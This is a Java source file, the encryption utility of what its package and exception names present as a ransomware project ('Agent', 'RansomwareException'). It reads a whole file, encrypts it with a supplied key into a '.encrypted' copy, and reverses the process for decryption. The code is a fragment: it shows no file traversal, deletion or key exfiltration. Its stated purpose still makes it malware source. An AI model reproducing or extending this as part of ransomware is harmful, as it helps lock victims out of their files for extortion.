package Agent.EncryptionAlgo;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import server.exceptions.RansomwareException;

public abstract class CryptoUtil implements EncryptionCodec {
	@Override
	public void decrypt(SecretKey skey, File fileToDecrypt) throws RansomwareException {
		try {
			SecretKey secretKey = getSecretKey(skey);
			Cipher cipher = Cipher.getInstance(secretKey.getAlgorithm());
			cipher.init(Cipher.DECRYPT_MODE, secretKey);

			FileInputStream inputStream = new FileInputStream(fileToDecrypt);
			byte[] inputBytes = new byte[(int) fileToDecrypt.length()];
			inputStream.read(inputBytes);

			byte[] outputBytes = cipher.doFinal(inputBytes);
			File outputFile = new File(fileToDecrypt.getAbsolutePath().replaceAll(".encrypted", ""));
			FileOutputStream outputStream = new FileOutputStream(outputFile);
			outputStream.write(outputBytes);

			inputStream.close();
			outputStream.close();

		} catch (Exception e) {
			throw new RansomwareException();
		}
	}

	@Override
	public void encrypt(SecretKey skey, File fileToEncrypt) throws RansomwareException {
		try {
			SecretKey secretKey = getSecretKey(skey);
			Cipher cipher = Cipher.getInstance(secretKey.getAlgorithm());
			cipher.init(Cipher.ENCRYPT_MODE, secretKey);

			FileInputStream inputStream = new FileInputStream(fileToEncrypt);
			byte[] inputBytes = new byte[(int) fileToEncrypt.length()];
			inputStream.read(inputBytes);

			byte[] outputBytes = cipher.doFinal(inputBytes);
			File outputFile = new File(fileToEncrypt.getAbsolutePath() + ".encrypted");

			FileOutputStream outputStream = new FileOutputStream(outputFile);
			outputStream.write(outputBytes);

			inputStream.close();
			outputStream.close();

		} catch (Exception e) {
			throw new RansomwareException();
		}

	}

	public abstract SecretKey getSecretKey(SecretKey skey);

}